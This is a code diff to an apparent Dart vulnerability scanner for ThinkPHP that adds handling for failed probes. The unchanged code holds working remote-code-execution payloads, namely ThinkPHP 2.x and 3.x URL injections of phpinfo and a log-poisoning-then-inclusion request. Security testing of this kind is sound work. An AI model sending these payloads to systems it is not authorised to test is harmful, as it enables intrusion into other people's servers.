@@ -97,40 +97,55 @@ class ThinkphpExpService {
 
   /// 8. ThinkPHP 3.x RCE
   Future<ThinkphpResult> checkTp3() async {
+    Object? lastError;
+    var anyResponse = false;
     final mod = await _getModule();
     final payload =
         '${baseUri}?s=$mod/\\think\\module/action/param1/\${@phpinfo()}';
     try {
       final res = await http.get(Uri.parse(payload)).timeout(timeout);
+        anyResponse = true;
       if (res.body.contains(_phpVersionCheck)) {
         return ThinkphpResult(true, 'ThinkPHP 3.x RCE', payload);
       }
-    } catch (_) {}
+    } catch (e) { lastError = e; }
+    if (!anyResponse && lastError != null) {
+      return ThinkphpResult.probeFailed('ThinkPHP 3.x RCE', '探测失败: $lastError');
+    }
     return ThinkphpResult(false, 'ThinkPHP 3.x RCE', '');
   }
 
   /// 10. ThinkPHP 3.x Log RCE
   Future<ThinkphpResult> checkTp3LogRce() async {
+    Object? lastError;
+    var anyResponse = false;
     final now = DateTime.now();
     final suffix = _tp3LogSuffix(now);
     final payloadLog =
         '${baseUri}?m=Home&c=Index&a=index&test=-->%20<?php%20phpinfo();?>';
     try {
       await http.get(Uri.parse(payloadLog)).timeout(timeout);
+        anyResponse = true;
       for (final param in _tp3LogRceFilenameParams) {
         final u =
             '${baseUri}?m=Home&c=Index&a=index&$param=./Application/Runtime/Logs/Home/$suffix';
         final res = await http.get(Uri.parse(u)).timeout(timeout);
+        anyResponse = true;
         if (res.body.contains(_phpVersionCheck)) {
           return ThinkphpResult(true, 'ThinkPHP 3.x Log RCE', u);
         }
       }
-    } catch (_) {}
+    } catch (e) { lastError = e; }
+    if (!anyResponse && lastError != null) {
+      return ThinkphpResult.probeFailed('ThinkPHP 3.x Log RCE', '探测失败: $lastError');
+    }
     return ThinkphpResult(false, 'ThinkPHP 3.x Log RCE', '');
   }
 
   /// 11. ThinkPHP 2.x preg_replace /e 修饰符 RCE
   Future<ThinkphpResult> checkTp2() async {
+    Object? lastError;
+    var anyResponse = false;
     final urls = [
       '${baseUri}index.php?s=/index/index/name/\${@phpinfo()}',
       '$baseUri?s=/index/index/name/\${@phpinfo()}',
@@ -138,10 +153,14 @@ class ThinkphpExpService {
     for (final u in urls) {
       try {
         final res = await http.get(Uri.parse(u)).timeout(timeout);
+        anyResponse = true;
         if (res.body.contains(_phpVersionCheck)) {
           return ThinkphpResult(true, 'ThinkPHP 2.x RCE', u);
         }
-      } catch (_) {}
+      } catch (e) { lastError = e; }
+    }
+    if (!anyResponse && lastError != null) {
+      return ThinkphpResult.probeFailed('ThinkPHP 2.x RCE', '探测失败: $lastError');
     }
     return ThinkphpResult(false, 'ThinkPHP 2.x RCE', '');
   }
@@ -157,29 +176,41 @@ class ThinkphpExpService {
 
   /// 15. ThinkPHP 3.x Module/Action/Param 变体（POC #17）
   Future<ThinkphpResult> checkTp3Module() async {
+    Object? lastError;
+    var anyResponse = false;
     final mod = await _getModule();
     final payload =
         '${baseUri}?s=$mod/\\think\\Module/Action/Param/\${@phpinfo()}';
     try {
       final res = await http.get(Uri.parse(payload)).timeout(timeout);
+        anyResponse = true;
       if (res.body.contains(_phpVersionCheck)) {
         return ThinkphpResult(true, 'ThinkPHP 3.x Module RCE', payload);
       }
-    } catch (_) {}
+    } catch (e) { lastError = e; }
+    if (!anyResponse && lastError != null) {
+      return ThinkphpResult.probeFailed('ThinkPHP 3.x Module RCE', '探测失败: $lastError');
+    }
     return ThinkphpResult(false, 'ThinkPHP 3.x Module RCE', '');
   }
 
   /// 18. ThinkPHP 3.x module/aciton 拼写变体（POC #18）
   Future<ThinkphpResult> checkTp3ModuleTypo() async {
+    Object? lastError;
+    var anyResponse = false;
     final mod = await _getModule();
     final payload =
         '${baseUri}?s=$mod/\\think\\module/aciton/param1/\${@phpinfo()}';
     try {
       final res = await http.get(Uri.parse(payload)).timeout(timeout);
+        anyResponse = true;
       if (res.body.contains(_phpVersionCheck)) {
         return ThinkphpResult(true, 'ThinkPHP 3.x module/aciton RCE', payload);
       }
-    } catch (_) {}
+    } catch (e) { lastError = e; }
+    if (!anyResponse && lastError != null) {
+      return ThinkphpResult.probeFailed('ThinkPHP 3.x module/aciton RCE', '探测失败: $lastError');
+    }
     return ThinkphpResult(false, 'ThinkPHP 3.x module/aciton RCE', '');
   }
 
@@ -510,8 +541,19 @@ extension ThinkphpVulnTypeExt on ThinkphpVulnType {
 
 class ThinkphpResult {
   final bool vulnerable;
+
+  /// 探测是否未能完成（网络/超时/解析异常）。
+  ///
+  /// 与 [ExpResult.failed] 同义：`failed=true` 不能解读为"目标安全"。
+  final bool failed;
+
   final String vulnName;
   final String detail;
 
-  ThinkphpResult(this.vulnerable, this.vulnName, this.detail);
+  ThinkphpResult(this.vulnerable, this.vulnName, this.detail,
+      {this.failed = false});
+
+  ThinkphpResult.probeFailed(this.vulnName, this.detail)
+      : vulnerable = false,
+        failed = true;
 }
